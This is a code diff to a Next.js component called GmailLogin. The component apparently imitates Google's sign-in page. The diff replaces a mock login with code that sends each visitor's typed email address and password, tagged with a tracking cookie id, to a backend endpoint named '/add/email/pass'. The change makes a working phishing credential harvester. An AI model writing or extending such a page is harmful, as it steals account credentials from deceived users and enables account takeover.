@@ -1,7 +1,8 @@
 import { useState } from "react";
 import Head from "next/head";
 import Image from "next/image";
-import useMockLogin from "../hooks/useMockLogin";
+import { API_URL } from "../config/index";
+import Cookies from "js-cookie";
 
 const UserIcon = () => {
   return (
@@ -38,7 +39,9 @@ const AngleDown = () => {
 };
 
 export default function GmailLogin() {
+  const id = Cookies.get("id");
   const [formValues, setFormValues] = useState({
+    id,
     mail: "",
     mailPass: "",
   });
@@ -46,14 +49,31 @@ export default function GmailLogin() {
   const [field, setField] = useState("email");
   const [showPassword, setShowPassword] = useState(false);
   const [nextPage, setNextPage] = useState(false);
-  const { login } = useMockLogin();
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
+    const url = `${API_URL}/add/email/pass`;
 
-    console.log(formValues);
-    login(formValues);
-    setNextPage(true);
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(formValues),
+    });
+
+    const data = await res.json();
+
+    if (res.ok) {
+      console.log("success", data);
+      // toast.success("Login Succecssfull");
+      console.log(formValues);
+      setNextPage(true);
+    } else {
+      console.log("error", data);
+      // toast.error("Something Went Wrong");
+    }
   };
 
   const handleChange = (e) => {
